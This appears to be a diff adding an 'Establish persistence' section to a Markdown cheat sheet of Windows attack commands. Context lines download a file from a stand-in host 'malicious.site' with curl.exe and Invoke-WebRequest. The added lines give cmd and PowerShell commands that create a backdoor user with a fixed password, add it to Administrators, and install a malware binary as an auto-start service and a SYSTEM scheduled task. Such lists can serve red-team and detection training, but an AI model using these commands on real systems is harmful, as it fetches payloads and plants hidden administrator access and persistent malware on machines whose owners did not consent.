@@ -189,3 +189,43 @@ curl.exe https://malicious.site/file.exe -o malware.exe
 
 Invoke-WebRequest -Uri 'https://malicious.site/file.exe' -OutFile 'malware.exe'
 ```
+
+### Establish persistence
+
+Create a new user
+
+```cmd
+# cmd
+net user "mr.malicious" "p4ssw0rd1" /add
+```
+
+```powershell
+# powershell
+New-LocalUser "mr.malicious" -Password "p4ssw0rd1"
+```
+
+Add the user to Administrators
+
+```cmd
+# cmd
+net localgroup Administrators "mr.malicious" /add
+```
+
+```powershell
+# powershell
+Add-LocalGroupMember "Administrators" -Member "mr.malicious"
+```
+
+Create a Windows service
+
+```cmd
+# runs after startup
+sc create "BadService" binpath= "C:\malware.exe" start=auto
+```
+
+Create a scheduled task
+
+```cmd
+# runs after startup
+schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System
+```
